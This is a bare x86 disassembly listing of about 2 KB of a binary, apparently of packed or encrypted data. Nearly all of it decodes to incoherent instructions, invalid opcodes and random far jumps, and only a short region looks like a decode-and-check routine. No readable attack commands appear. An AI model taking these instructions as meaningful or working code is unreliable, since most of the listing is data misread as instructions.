  4166ad:	gs jne 0x416729
  4166b0:	rcl    BYTE PTR [eax],1
  4166b2:	push   esi
  4166b3:	mov    ebp,esi
  4166b5:	psubb  mm7,QWORD PTR [esi-0x64]
  4166b9:	pop    ds
  4166ba:	jl     0x4166c6
  4166bc:	mov    ebp,0x24555252
  4166c1:	xlat   BYTE PTR ds:[ebx]
  4166c2:	cmp    esi,DWORD PTR [edx+0x19b7c7d]
  4166c8:	jl     0x4166cd
  4166ca:	mov    bh,0x51
  4166cc:	push   esp
  4166cd:	aad    0xde
  4166cf:	push   edi
  4166d0:	jl     0x41667c
  4166d2:	push   ds
  4166d3:	jmp    0x4166d4
  4166d5:	cmp    eax,0xcf7bcccc
  4166da:	es jmp 0x736a5b12
  4166e0:	popa   
  4166e1:	cli    
  4166e2:	sub    bh,BYTE PTR [esi-0x2e3c6e7c]
  4166e8:	mov    DWORD PTR [eax-0x48c8b89d],0x22d3d932
  4166f2:	lds    esi,FWORD PTR [eax]
  4166f4:	cwde   
  4166f5:	add    eax,0x3aa266ad
  4166fa:	outs   dx,BYTE PTR ds:[esi]
  4166fb:	adc    al,cl
  4166fd:	icebp  
  4166fe:	inc    ebx
  4166ff:	daa    
  416700:	xor    esp,edi
  416702:	adc    eax,0xf8462f74
  416707:	fisubr WORD PTR [eax]
  416709:	mov    ds:0xc9481cb2,eax
  41670e:	dec    edx
  41670f:	(bad)  
  416710:	retf   0x96f1
  416713:	adc    ecx,edx
  416715:	daa    
  416716:	add    al,0xaa
  416718:	test   BYTE PTR [esi+0x1c20fb70],ah
  41671e:	fistp  QWORD PTR [edx+ebx*1+0x348909e2]
  416725:	dec    ebx
  416726:	push   ss
  416727:	push   cs
  416728:	xchg   ecx,eax
  416729:	addr16 mov cl,0xbd
  41672c:	pop    edx
  41672d:	jmp    0x4167a1
  41672f:	mov    ecx,ds
  416731:	jmp    DWORD PTR [esp+eiz*2-0x3a]
  416735:	adc    ebp,DWORD PTR [ebp+0x4d]
  416738:	out    0x78,al
  41673a:	add    al,0x93
  41673c:	test   BYTE PTR gs:[ebx+edx*1-0x771e799],dl
  416744:	push   ds
  416745:	and    DWORD PTR [edx-0x63],esi
  416748:	mov    edi,0x6224ea3f
  41674d:	mov    esp,0x1564ad88
  416752:	mov    ah,0x1b
  416754:	call   0x9b3a51bb
  416759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41675a:	adc    eax,0x9c215a48
  41675f:	in     eax,0x1a
  416761:	and    DWORD PTR [ebx+eax*1-0xa0a68ab],edi
  416768:	cmp    eax,0x8bd612a
  41676d:	(bad)  
  41676e:	aam    0x1a
  416770:	(bad)  
  416771:	mul    ebp
  416773:	sbb    BYTE PTR [edi],0x4
  416776:	sub    BYTE PTR [edx+0x40],cl
  416779:	fstp   QWORD PTR [ecx+ecx*2+0x13a86c5e]
  416780:	pop    es
  416781:	fimul  DWORD PTR [ebx-0x19778198]
  416787:	jb     0x416775
  416789:	les    esi,FWORD PTR [edx+0xc9c1fe4]
  41678f:	and    BYTE PTR [eax-0x44],dl
  416792:	cli    
  416793:	push   edi
  416794:	mov    ah,0x2d
  416796:	inc    bl
  416798:	ja     0x416726
  41679a:	mov    ah,0xca
  41679c:	cwde   
  41679d:	pop    ss
  41679e:	imul   ebx,esp,0xb02f826b
  4167a4:	xchg   ebp,eax
  4167a5:	mov    ebp,0xeb485367
  4167aa:	dec    ebx
  4167ab:	ficomp WORD PTR ds:0x3b1f061
  4167b1:	push   0x48
  4167b3:	sub    eax,esi
  4167b5:	int    0xc6
  4167b7:	push   cs
  4167b8:	in     eax,dx
  4167b9:	test   DWORD PTR [edx+0x56],ebp
  4167bc:	pop    edi
  4167bd:	add    al,0xb1
  4167bf:	call   0x86cb:0x31f5aacf
  4167c6:	mov    ebx,0x435519f7
  4167cb:	xor    BYTE PTR [eax-0x4ccadf37],bl
  4167d1:	xchg   edi,eax
  4167d2:	repnz shl edx,1
  4167d5:	in     al,dx
  4167d6:	or     DWORD PTR [esi+eax*2-0x62808fb3],eax
  4167dd:	jmp    0x2624302d
  4167e2:	aad    0xbd
  4167e4:	pop    ebx
  4167e5:	cmp    ebx,eax
  4167e7:	inc    esp
  4167e8:	xor    ch,BYTE PTR [esi+0x2b]
  4167eb:	ins    BYTE PTR es:[edi],dx
  4167ec:	push   edi
  4167ed:	mov    al,bl
  4167ef:	call   0xb530:0x13a4d482
  4167f6:	xchg   esi,esi
  4167f8:	pop    edx
  4167f9:	mov    WORD PTR [ebx+0x189c974],?
  4167ff:	mov    eax,DWORD PTR [ebp-0x8]
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	and    eax,0x76ee21e1
  41681d:	and    edi,DWORD PTR [edi+0x78]
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x4167ce
  416825:	or     al,0x7e
  416827:	xchg   DWORD PTR [esi-0x5a8b657e],ebp
  41682d:	test   al,0xa7
  41682f:	or     eax,0x5e420c81
  416834:	push   edi
  416835:	xchg   edx,eax
  416836:	inc    ecx
  416837:	push   ecx
  416838:	mov    bl,0xb6
  41683a:	imul   esp,DWORD PTR [esi+0xcbee573],0xeb01d5e7
  416844:	jbe    0x41684e
  416846:	or     eax,0x6410c1b4
  41684b:	pop    ebx
  41684c:	ret    0xa6d
  41684f:	adc    eax,0xe278f785
  416854:	or     ah,BYTE PTR [ebx]
  416856:	inc    edx
  416857:	xor    esp,edi
  416859:	xchg   ecx,edx
  41685b:	loop   0x4167f1
  41685d:	dec    ebx
  41685e:	sub    al,BYTE PTR [esi+0x17]
  416861:	enter  0xd9fc,0x38
  416865:	icebp  
  416866:	inc    ecx
  416867:	and    al,0x6f
  416869:	fdiv   st(3),st
  41686b:	and    bl,BYTE PTR [eax+ecx*1]
  41686e:	retf   
  41686f:	xor    BYTE PTR [edx+0x2f88f40e],bl
  416875:	outs   dx,DWORD PTR ds:[esi]
  416876:	repz into 
  416878:	adc    DWORD PTR [edx],edx
  41687a:	and    ch,BYTE PTR [edx+0x38]
  41687d:	cmp    DWORD PTR [ecx+0xbfdf162],ebx
  416883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416884:	mov    esp,0x134685d7
  416889:	loopne 0x41686c
  41688b:	in     eax,dx
  41688c:	push   ecx
  41688d:	int    0x69
  41688f:	xchg   esi,eax
  416890:	fisubr DWORD PTR [ebx+eiz*1]
  416893:	push   es
  416894:	dec    ebp
  416895:	out    0xa4,al
  416897:	inc    esi
  416898:	test   al,0x52
  41689a:	pop    ebp
  41689b:	mov    ecx,0x8109de1a
  4168a0:	mov    cl,0x2a
  4168a2:	adc    bl,BYTE PTR [esi-0x3]
  4168a5:	mov    ch,0xaa
  4168a7:	aad    0x6a
  4168a9:	out    0x1d,eax
  4168ab:	fwait
  4168ac:	add    al,0x2a
  4168ae:	cmp    DWORD PTR [edi+0x4f],0x72
  4168b2:	arpl   bx,dx
  4168b4:	inc    ecx
  4168b5:	mov    ah,bh
  4168b7:	fisub  WORD PTR [ebx-0x6b]
  4168ba:	scas   al,BYTE PTR es:[edi]
  4168bb:	pusha  
  4168bc:	sbb    al,0xf
  4168be:	jbe    0x4168ba
  4168c0:	inc    edx
  4168c1:	cmp    BYTE PTR [eax-0x7d38ebeb],al
  4168c7:	xchg   DWORD PTR [ebx+0x3ea16184],esp
  4168cd:	(bad)  
  4168ce:	in     al,dx
  4168cf:	jne    0x416851
  4168d1:	sub    BYTE PTR [edx-0x3b480e13],ch
  4168d7:	dec    ebp
  4168d8:	push   cs
  4168d9:	push   0xffffff90
  4168db:	(bad)  
  4168dc:	jg     0x416925
  4168de:	adc    DWORD PTR [esp+ecx*8],edx
  4168e1:	dec    ebx
  4168e2:	repnz cmp DWORD PTR [ebx+0x6d3293a8],ebx
  4168e9:	push   ds
  4168ea:	mov    ebx,0x105fcc51
  4168ef:	outs   dx,BYTE PTR ds:[esi]
  4168f0:	(bad)  
  4168f2:	fidivr DWORD PTR [edx+eax*1+0x1fbea6fa]
  4168f9:	test   BYTE PTR [esi],cl
  4168fb:	xchg   ecx,eax
  4168fc:	adc    dh,BYTE PTR [edx]
  4168fe:	sub    eax,0xcdd41e29
  416903:	ja     0x41697f
  416905:	rcr    BYTE PTR [edx],cl
  416907:	cmp    ecx,DWORD PTR [esi-0x4040d9af]
  41690d:	test   BYTE PTR [ecx-0x37],ah
  416910:	inc    esp
  416911:	call   FWORD PTR [ebp-0x2b0ef8f9]
  416917:	xchg   edx,eax
  416918:	xor    ebx,ebp
  41691a:	inc    ebx
  41691b:	cmovnp edi,DWORD PTR [edx]
  41691e:	sbb    BYTE PTR [eax-0x292547f5],dh
  416924:	add    al,cl
  416926:	out    0x86,eax
  416928:	repnz leave 
  41692a:	test   eax,0xcfd0f649
  41692f:	imul   esp,ebp,0x73
  416932:	sub    al,0x69
  416934:	int3   
  416935:	lods   eax,DWORD PTR ds:[esi]
  416936:	sbb    ah,dl
  416938:	fidiv  WORD PTR [ebp+edx*8+0x70]
  41693c:	ins    BYTE PTR es:[edi],dx
  41693d:	jmp    0x5cde41eb
  416942:	int3   
  416943:	es mov esi,0x2dac5ce1
  416949:	mov    ds:0xd1023919,al
  41694e:	pop    esi
  41694f:	repz mov ds:0xa9f2d27c,al
  416955:	test   DWORD PTR [eax],edx
  416957:	add    dh,BYTE PTR [esi]
  416959:	sahf   
  41695a:	mov    cl,0x74
  41695c:	mov    al,ds:0x392d27f0
  416961:	cld    
  416962:	or     BYTE PTR [ebx+esi*1],dl
  416965:	ss repnz and al,0xbc
  416969:	aas    
  41696a:	sub    DWORD PTR [ebx],ebp
  41696c:	icebp  
  41696d:	pop    ebp
  41696e:	mov    cs,WORD PTR [ebx+eiz*2]
  416971:	xchg   edx,eax
  416972:	jl     0x4169d2
  416974:	out    0x3c,eax
  416976:	add    edx,DWORD PTR [ebp+0x5]
  416979:	xor    eax,DWORD PTR [ebp+0x23]
  41697c:	add    ebx,DWORD PTR [esi-0x53]
  41697f:	mov    ch,0xc9
  416981:	cmp    bh,cl
  416983:	xchg   BYTE PTR [edi],bl
  416985:	fwait
  416986:	adc    BYTE PTR [edi+0x40cb7f28],bl
  41698c:	inc    esi
  41698d:	cmp    cl,BYTE PTR ss:[eax]
  416990:	push   ebp
  416991:	aas    
  416992:	pop    ds
  416993:	and    ebp,DWORD PTR gs:[ebp-0x347fdbd6]
  41699a:	aam    0xd1
  41699c:	sbb    eax,0xe53ed5f6
  4169a1:	test   BYTE PTR [esi],bl
  4169a3:	jp     0x4169a6
  4169a5:	mov    BYTE PTR [ebx+0x3f85afb],bh
  4169ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169ac:	adc    eax,0x3ab5a0ac
  4169b1:	stos   BYTE PTR es:[edi],al
  4169b2:	test   DWORD PTR [ecx+0x3c],0x6e72ae0a
  4169b9:	mov    eax,0x48d2d9ff
  4169be:	cmp    esp,DWORD PTR [eax-0x7a8d00bd]
  4169c4:	jp     0x416a37
  4169c6:	call   0x72aa6792
  4169cb:	sub    dh,bl
  4169cd:	(bad)  
  4169ce:	jp     0x4169e8
  4169d0:	add    ebp,edx
  4169d2:	jg     0x416a46
  4169d4:	sbb    ch,BYTE PTR [ebp-0x5b]
  4169d7:	int3   
  4169d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169d9:	stc    
  4169da:	adc    ecx,edx
  4169dc:	inc    esi
  4169dd:	repz pop ss
  4169df:	stos   BYTE PTR es:[edi],al
  4169e0:	fs jg  0x4169a3
  4169e3:	pop    edi
  4169e4:	pop    eax
  4169e5:	xchg   edx,eax
  4169e6:	and    eax,0x8c239c19
  4169eb:	into   
  4169ec:	imul   esi,DWORD PTR ds:0x29723964,0x67
  4169f3:	push   ds
  4169f4:	jno    0x416a53
  4169f6:	or     ch,dh
  4169f8:	fnop   
  4169fa:	shl    dl,0x2a
  4169fd:	push   0x563452a0
  416a02:	mov    bh,0x5f
  416a04:	jne    0x416a4a
  416a06:	push   ecx
  416a07:	pushf  
  416a08:	(bad)  
  416a09:	sar    BYTE PTR [eax+ebx*1],1
  416a0c:	adc    BYTE PTR [ebx+edx*8-0x1b],bl
  416a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a11:	jbe    0x416a77
  416a13:	push   es
  416a14:	sub    ah,ah
  416a16:	shl    BYTE PTR cs:[eax+0x5e858ec9],1
  416a1d:	jmp    0x4169e7
  416a1f:	inc    ecx
  416a20:	outs   dx,BYTE PTR ds:[esi]
  416a21:	jmp    0xd845:0x7f91dc8d
  416a28:	sub    BYTE PTR [ecx],ah
  416a2a:	mov    ecx,0x5c655f3c
  416a2f:	mov    esp,0x1a21bd8
  416a34:	cld    
  416a35:	retf   0x85cd
  416a38:	rol    BYTE PTR [edx+0x12],cl
  416a3b:	popf   
  416a3c:	lea    ebx,[edi+eax*4-0x8]
  416a40:	sub    al,0x92
  416a42:	loope  0x416a45
  416a44:	rol    DWORD PTR [eax+edi*1+0x4f],0xde
  416a49:	scas   al,BYTE PTR es:[edi]
  416a4a:	lock in eax,0x1
  416a4d:	mov    dl,BYTE PTR [eax+0x6872537c]
  416a53:	pop    ds
  416a54:	add    eax,0xa7e4a978
  416a59:	aaa    
  416a5a:	pop    ebp
  416a5b:	push   eax
  416a5c:	aas    
  416a5d:	mov    ds:0xe7489fa6,eax
  416a62:	jne    0x416a76
  416a64:	cmp    BYTE PTR [ebp-0x5c],bl
  416a67:	pop    ss
  416a68:	mov    fs,WORD PTR [ebx-0x4c0430d5]
  416a6e:	mov    ecx,0xd8f60f87
  416a73:	adc    eax,0x13de220a
  416a78:	pop    es
  416a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a7a:	adc    ch,ch
  416a7c:	jne    0x416a53
  416a7e:	iret   
  416a7f:	jp     0x416a84
  416a81:	mov    BYTE PTR [ebx],dh
  416a83:	nop
  416a84:	mov    bh,0x76
  416a86:	mov    DWORD PTR ds:0xd9137bfc,ebx
  416a8c:	rol    BYTE PTR [ebx+0x5d],0x10
  416a90:	sub    esp,DWORD PTR [edx]
  416a92:	add    edx,ebp
  416a94:	xchg   ebx,eax
  416a95:	sbb    BYTE PTR [ebx+0xb],bl
  416a98:	ins    DWORD PTR es:[edi],dx
  416a99:	outs   dx,DWORD PTR ds:[esi]
  416a9a:	shl    esi,0xed
  416a9d:	inc    edx
  416a9e:	add    eax,0xb2fae1f2
  416aa3:	scas   eax,DWORD PTR es:[edi]
  416aa4:	out    0x41,al
  416aa6:	push   ebp
  416aa7:	sar    DWORD PTR [edx],cl
  416aa9:	pop    ebp
  416aaa:	test   eax,0x9abd257
  416aaf:	xor    DWORD PTR [esi],ebp
  416ab1:	and    BYTE PTR [edx],dh
  416ab3:	mov    BYTE PTR [eax-0x21d7d2d1],cl
  416ab9:	pop    esp
  416aba:	(bad)  
  416abb:	jle    0x416b13
  416abd:	mov    DWORD PTR [ebx-0x75],eax
  416ac0:	inc    ebp
  416ac1:	cld    
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0xc464ff75
  416ad4:	inc    ebp
  416ad5:	(bad)  [ecx-0x6d]
  416ad8:	and    BYTE PTR [edi+0x78],bh
  416adb:	xchg   ebp,eax
  416adc:	jle    0x416b56
  416ade:	js     0x416b3a
  416ae0:	fiadd  WORD PTR [ebp-0x5a]
  416ae3:	in     al,dx
  416ae4:	in     eax,0xe3
  416ae6:	mov    DWORD PTR [ecx-0x24],esi
  416ae9:	xor    esi,DWORD PTR [edx+0x6a4da92e]
  416aef:	pop    ss
  416af0:	jl     0x416aa1
  416af2:	add    edx,ecx
  416af4:	pop    ebx
  416af5:	push   ds
  416af6:	jmp    ebx
  416af8:	ror    DWORD PTR [edx-0x560bae2],1
  416afe:	jne    0x416aec
  416b00:	jmp    0x962a:0xbe0c07df
  416b07:	ss inc esi
  416b09:	xor    ch,0xbf
  416b0c:	add    eax,0xdbb1e89b
  416b11:	in     al,dx
  416b12:	push   cs
  416b13:	shr    BYTE PTR ds:0x3883f1cc,0x8c
  416b1a:	sbb    DWORD PTR [eax+0xf124a5d],eax
  416b20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b21:	(bad)  
  416b22:	jg     0x416b2a
  416b24:	arpl   WORD PTR [edi],cx
  416b26:	aam    0xab
  416b28:	mov    BYTE PTR [ecx-0x2],dh
  416b2b:	nop
  416b2c:	(bad)  
  416b2d:	mov    DWORD PTR [edi-0x12],ecx
  416b30:	pop    edx
  416b31:	ins    DWORD PTR es:[edi],dx
  416b32:	and    DWORD PTR [eax],0xffffff9a
  416b35:	stc    
  416b36:	mov    ah,0x85
  416b38:	(bad)  
  416b39:	in     al,0x17
  416b3b:	enter  0x1f0d,0x92
  416b3f:	mov    ebx,0x454d517c
  416b44:	xor    ch,BYTE PTR [eax-0x44]
  416b47:	loop   0x416b9b
  416b49:	xchg   BYTE PTR [edx+0x56dcc303],ch
  416b4f:	sub    dh,BYTE PTR [esi+eiz*4-0x3bc44df2]
  416b56:	fs mov ah,0xc4
  416b59:	rol    DWORD PTR [ebx],1
  416b5b:	and    ebx,DWORD PTR [eax-0x3f]
  416b5e:	std    
  416b5f:	int    0x6a
  416b61:	imul   DWORD PTR [ecx+ebx*8-0x24]
  416b65:	(bad)  
  416b66:	push   ss
  416b67:	dec    ecx
  416b68:	aad    0x5a
  416b6a:	mov    ch,0xc3
  416b6c:	jmp    0x416b46
  416b6e:	sbb    DWORD PTR [edx+esi*8+0x22],esp
  416b72:	lods   al,BYTE PTR ds:[esi]
  416b73:	outs   dx,BYTE PTR ds:[esi]
  416b74:	jp     0x416b4e
  416b76:	(bad)  
  416b77:	xlat   BYTE PTR ds:[ebx]
  416b78:	sub    al,0xb2
  416b7a:	imul   DWORD PTR [ebp-0x21112fbb]
  416b80:	call   0xd5f9:0x60e38896
  416b87:	aad    0x56
  416b89:	in     al,dx
  416b8a:	jecxz  0x416bfc
  416b8c:	outs   dx,BYTE PTR ds:[esi]
  416b8d:	dec    esi
  416b8e:	ins    DWORD PTR es:[edi],dx
  416b8f:	inc    ecx
  416b90:	aaa    
  416b91:	pop    edi
  416b92:	aad    0x9d
  416b94:	call   0x4307d246
  416b99:	dec    edi
  416b9a:	mov    ah,0x6
  416b9c:	add    eax,0x2145e9e4
  416ba1:	loop   0x416b53
  416ba3:	retf   
  416ba4:	xchg   esi,eax
  416ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ba6:	sub    BYTE PTR [eax-0x5d],bl
  416ba9:	ror    bh,1
  416bab:	in     al,0xbb
  416bad:	pop    ss
  416bae:	pop    ebx
  416baf:	push   edx
  416bb0:	popf   
  416bb1:	sbb    al,BYTE PTR [edx+0x7e8d6be8]
  416bb7:	cld    
  416bb8:	mov    ch,0x2a
  416bba:	sbb    eax,0xd0a9be31
  416bbf:	cdq    
  416bc0:	enter  0xf63e,0xd9
  416bc4:	push   ss
  416bc5:	test   BYTE PTR [ebx],al
  416bc7:	or     edx,DWORD PTR [edx]
  416bc9:	xchg   BYTE PTR [ebx],cl
  416bcb:	pop    ebx
  416bcc:	mov    ecx,0xbbcebfa8
  416bd1:	push   0xc96abb4d
  416bd6:	mov    bl,0x9b
  416bd8:	mov    ebx,0x4273dfe5
  416bdd:	outs   dx,BYTE PTR ds:[esi]
  416bde:	repnz lds eax,FWORD PTR [ecx-0x79]
  416be2:	int    0xb5
  416be4:	push   ss
  416be5:	das    
  416be6:	inc    esi
  416be7:	in     eax,dx
  416be8:	sub    BYTE PTR [eax],cl
  416bea:	or     eax,0x9eb92151
  416bef:	lods   al,BYTE PTR ds:[esi]
  416bf0:	out    0xb7,al
  416bf2:	test   al,0x7f
  416bf4:	jmp    0xed1563a3
  416bf9:	(bad)  
  416bfb:	xchg   ebp,eax
  416bfc:	xor    ebx,DWORD PTR [ebp-0x1597946e]
  416c02:	sbb    eax,0x2d58f4f7
  416c07:	jb     0x416bf0
  416c09:	popa   
  416c0a:	sbb    DWORD PTR ds:0xac50878e,ecx
  416c10:	and    ah,BYTE PTR [eax+0x5a]
  416c13:	int3   
  416c14:	retf   0xeab
  416c17:	mov    ebp,0x77d3c52c
  416c1c:	(bad)  
  416c1e:	test   DWORD PTR [edi],edi
  416c20:	mov    bh,0x4c
  416c22:	push   es
  416c23:	pop    esi
  416c24:	add    bh,BYTE PTR [eax+ebx*2+0x33]
  416c28:	rol    BYTE PTR [ebx+edx*8+0x2c],1
  416c2c:	cld    
  416c2d:	cwde   
  416c2e:	mov    ah,ch
  416c30:	or     BYTE PTR [edx],cl
  416c32:	rep outs dx,DWORD PTR ds:[esi]
  416c34:	stos   DWORD PTR es:[edi],eax
  416c35:	cwde   
  416c36:	inc    edi
  416c37:	(bad)  
  416c38:	jp     0x416c16
  416c3a:	add    eax,0xe31677b2
  416c3f:	mov    al,0x8
  416c41:	pop    ds
  416c42:	imul   ebx,DWORD PTR [edx-0x2e],0x45
  416c46:	add    esi,esp
  416c48:	mov    eax,0xd9f54968
  416c4d:	xor    eax,0xe5d9eb3e
  416c52:	into   
  416c53:	fimul  WORD PTR [esi]
  416c55:	mov    eax,0x6479733
  416c5a:	retf   0xe8a7
  416c5d:	dec    eax
  416c5e:	arpl   bp,bp
  416c60:	mov    ah,0x88
  416c62:	xchg   ebx,eax
  416c63:	stc    
  416c64:	mov    eax,0x5cbdf1e3
  416c69:	pop    ss
  416c6a:	arpl   WORD PTR [eax+0x63],bp
  416c6d:	call   0xe4dc0824
  416c72:	inc    ecx
  416c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c74:	jns    0x416caa
  416c76:	aad    0x5a
  416c78:	inc    esi
  416c79:	ror    DWORD PTR [ebx-0x1c1e9629],cl
  416c7f:	pop    ss
  416c80:	jge    0x416cad
  416c82:	call   FWORD PTR [ecx+0x54699082]
  416c88:	sti    
  416c89:	cs jp  0x416d04
  416c8c:	dec    ebx
  416c8d:	jp     0x416c1c
  416c8f:	icebp  
  416c90:	into   
  416c91:	daa    
  416c92:	cmp    al,0x85
  416c94:	dec    esi
  416c95:	mov    al,ds:0xdf3129e1
  416c9a:	xchg   esp,eax
  416c9b:	lods   al,BYTE PTR ds:[esi]
  416c9c:	ja     0x416cca
  416c9e:	adc    ah,0x96
  416ca1:	or     BYTE PTR ds:0x4e837dea,bl
  416ca7:	mov    ah,al
  416ca9:	jne    0x416c4d
  416cab:	fstp   DWORD PTR [edx+0x7c]
  416cae:	out    dx,eax
  416caf:	pop    ebx
  416cb0:	pop    edi
  416cb1:	neg    DWORD PTR [eax+0x3420b2cc]
  416cb7:	mov    dl,ch
  416cb9:	pop    ss
  416cba:	jle    0x416c40
  416cbc:	push   ebx
  416cbd:	mov    esi,0x8852c49a
  416cc2:	ins    DWORD PTR es:[edi],dx
  416cc3:	or     dh,BYTE PTR [eax-0x797e9e5d]
  416cc9:	retf   
  416cca:	pushf  
  416ccb:	jns    0x416d30
  416ccd:	push   esp
  416cce:	imul   ebp,DWORD PTR [ecx+0x2ba20671],0x4bb869a
  416cd8:	and    eax,0xf9f150ba
  416cdd:	mov    bh,0xf5
  416cdf:	cmc    
  416ce0:	inc    edi
  416ce1:	outs   dx,BYTE PTR ds:[esi]
  416ce2:	jecxz  0x416cc6
  416ce4:	stos   DWORD PTR es:[edi],eax
  416ce5:	repz int3 
  416ce7:	stos   DWORD PTR es:[edi],eax
  416ce8:	xchg   edi,eax
  416ce9:	sub    cl,dl
  416ceb:	xchg   ecx,eax
  416cec:	adc    DWORD PTR [edi+0x36],ecx
  416cef:	in     al,0x4
  416cf1:	dec    ebx
  416cf2:	in     al,0x8e
  416cf4:	sub    BYTE PTR [ebx],bl
  416cf6:	xchg   edi,eax
  416cf7:	jo     0x416caf
  416cf9:	fild   QWORD PTR [edi+0x0]
  416cfc:	adc    eax,0xf0e2a99c
  416d01:	pavgb  mm5,mm1
  416d04:	jae    0x416d64
  416d06:	ret    
  416d07:	pop    ebx
  416d08:	or     DWORD PTR [esi+0x18],eax
  416d0b:	test   BYTE PTR [eax],ah
  416d0d:	jnp    0x416d2d
  416d0f:	pop    eax
  416d10:	(bad)  
  416d11:	jb     0x416c97
  416d13:	rep ins BYTE PTR es:[edi],dx
  416d15:	mov    esp,0x892b4bfe
  416d1a:	std    
  416d1b:	and    DWORD PTR [edx-0x5ad150b0],ebp
  416d21:	imul   al
  416d23:	mov    al,0xd8
  416d25:	xchg   ebx,edx
  416d27:	dec    edx
  416d28:	inc    ebp
  416d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d2a:	aam    0x21
  416d2c:	and    esi,DWORD PTR [edi-0x63869bea]
  416d32:	and    DWORD PTR [ebp+edi*1+0x6b],ecx
  416d36:	jno    0x416d34
  416d38:	sbb    DWORD PTR [ebp-0x3ea5c0f9],ecx
  416d3e:	pop    ss
  416d3f:	pop    esi
  416d40:	out    dx,al
  416d41:	sub    cl,BYTE PTR [edi+0x2fa3b44d]
  416d47:	sub    BYTE PTR [edx+eax*8-0x11308baf],0xa7
  416d4f:	ins    DWORD PTR es:[edi],dx
  416d50:	sub    al,0xbc
  416d52:	enter  0xfcef,0x9c
  416d56:	cmp    eax,0x6496cff
  416d5b:	sub    eax,0x35a376e9
  416d60:	pop    esp
  416d61:	out    dx,al
  416d62:	and    BYTE PTR ds:0x48d4f2cc,ah
  416d68:	sbb    dl,bl
  416d6a:	mov    bh,0xff
  416d6c:	int    0xa3
  416d6e:	xchg   DWORD PTR [eax+eax*1-0x4a26363],esp
  416d75:	jo     0x416df5
  416d77:	mov    ebx,DWORD PTR [edi+0x33]
  416d7a:	mov    ecx,DWORD PTR [ebp+0x10]
  416d7d:	xor    eax,edi
  416d7f:	add    eax,esi
  416d81:	cmp    eax,ecx
  416d83:	jne    0x41731c
  416d89:	mov    eax,DWORD PTR [ebp-0x4]
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0xc72f:0x15cd1efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	add    al,0x28
  416db9:	xor    al,0x50
  416dbb:	imul   ebx,DWORD PTR [eax-0x75f2b491],0xe2f78769
  416dc5:	sbb    al,0x8e
  416dc7:	fmul   st,st(6)
  416dc9:	scas   eax,DWORD PTR es:[edi]
  416dca:	fimul  WORD PTR [eax-0x1c]
  416dcd:	ja     0x416d8f
  416dcf:	pop    ss
  416dd0:	inc    ecx
  416dd1:	cld    
  416dd2:	call   0x45612a53
  416dd7:	fimul  WORD PTR [esi-0x600f30d9]
  416ddd:	mov    ah,0xe4
  416ddf:	outs   dx,BYTE PTR ds:[esi]
  416de0:	push   eax
  416de1:	(bad)  
  416de2:	out    dx,eax
  416de3:	jl     0x416dbe
  416de5:	mov    ds:0x7af657ab,al
  416dea:	repz mov ah,0x3f
  416ded:	stc    
  416dee:	cdq    
  416def:	mov    dh,BYTE PTR [ebx+0x6b0832f8]
  416df5:	mov    ds:0x1105b368,eax
  416dfa:	jns    0x416e03
  416dfc:	pop    esp
  416dfd:	xor    ecx,ebp
  416dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e00:	fcmovnbe st,st(7)
  416e02:	leave  
  416e03:	daa    
  416e04:	and    BYTE PTR [ebx],ch
  416e06:	xor    DWORD PTR [ebp-0x4c],edx
  416e09:	sbb    ch,BYTE PTR [ebp+0x7b]
  416e0c:	push   esi
  416e0d:	into   
  416e0e:	mov    ds:0x3d2a64fb,eax
  416e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e14:	cld    
  416e15:	mov    edx,0x8d2b943e
  416e1a:	stos   DWORD PTR es:[edi],eax
  416e1b:	test   DWORD PTR [edx-0x7b],ecx
  416e1e:	cmp    BYTE PTR [ecx+0x569c3e52],0x32
  416e25:	and    al,0xf3
  416e27:	ret    0xca60
  416e2a:	or     eax,0x4460bbb0
  416e2f:	adc    al,0x4b
  416e31:	cmp    ebx,ebx
  416e33:	das    
  416e34:	mov    dh,0xce
  416e36:	es (bad) 
  416e38:	xor    ebx,ecx
  416e3a:	shl    BYTE PTR [esp+eiz*4],cl
  416e3d:	das    
  416e3e:	pop    esp
  416e3f:	dec    ecx
  416e40:	clc    
  416e41:	mov    eax,ds:0x4ee9b6b2
  416e46:	popa   
  416e47:	sbb    dh,BYTE PTR [edi]
  416e49:	hlt    
  416e4a:	pop    ss
  416e4b:	adc    al,0x5b
  416e4d:	cmp    al,0x5d
  416e4f:	pop    es
  416e50:	sub    al,0xe2
  416e52:	outs   dx,DWORD PTR ds:[esi]
  416e53:	sub    DWORD PTR fs:[eax+0x6ae954e9],ebp
  416e5a:	jp     0x416ed7
  416e5c:	inc    ebx
  416e5d:	push   0x0
  416e5f:	jne    0x416eb0
  416e61:	imul   edi,DWORD PTR [eax],0xdefe51a6
  416e67:	mov    ecx,0x53de713e
  416e6c:	and    ebx,esi
  416e6e:	(bad)  
  416e6f:	sub    ecx,DWORD PTR [esi]
  416e71:	out    0x5f,al
  416e73:	clc    
  416e74:	inc    ecx
